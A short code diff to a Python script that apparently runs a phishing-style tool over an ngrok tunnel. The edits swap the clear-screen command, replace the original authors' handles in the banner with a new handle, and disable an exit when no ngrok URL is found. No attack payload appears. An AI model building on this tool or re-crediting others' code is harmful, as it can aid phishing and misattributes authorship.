@@ -40,7 +40,7 @@ TOKEN_FILE = "token.txt"
 # -------------------------------------------------------------------
 
 def clear():
-    os.system("cls || clear")
+    os.system("clear || cls")
 
 def OS():
     return os.path.exists("/data/data/com.termux")
@@ -73,7 +73,7 @@ if OS():
 ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
 ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
 
-    {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n                                       
+    {colors['red']}Tg&Git: @c2-tlhah{colors['reset']}\n\n                                       
 """
 else:
     if 'Linux' in __import__("platform").system():
@@ -93,7 +93,7 @@ else:
              `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
                  `--'  `"                                       '---'   '---'           '---'   '---' 
 
-                {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n
+                {colors['red']}Tg&Git: @c2-tlhah{colors['reset']}\n\n                                       
                  """
 
 print (b)
@@ -172,7 +172,7 @@ def ngrok_url():
             return matches
         else:
             print(f"\n{messages['error']}No ngrok URL found. Use a VPN if you are banned")
-            exit()
+            # exit() # Don't exit, allow local testing
     except Exception as e:
         print(f"\n{messages['error']}Error:", e)
         return None
